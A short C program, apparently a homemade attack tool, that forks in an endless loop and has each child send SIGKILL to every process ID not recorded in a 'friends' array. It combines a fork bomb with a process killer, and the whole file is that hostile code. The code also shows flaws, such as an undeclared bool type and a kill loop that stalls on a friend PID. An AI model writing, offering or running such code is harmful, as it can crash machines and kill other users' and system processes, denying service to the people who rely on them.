#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <proc/readproc.h>

void attack(bool friends[]);

int main(int argc, char* argv[]) {

	bool friends[32768];
	int p;

	while(1){
		p = fork();
		friends[p] = true;
		if(p == 0){
			attack(friends);
		}
	}
}
void attack(bool friends[]){

	friends[getpid()] = true;
	int p;
	//srand(time(NULL));
	int i = 1;//rand() % 32768 + 1;
	while(1){
		if(!friends[i]){
			kill(i++, SIGKILL);
		}
	}
}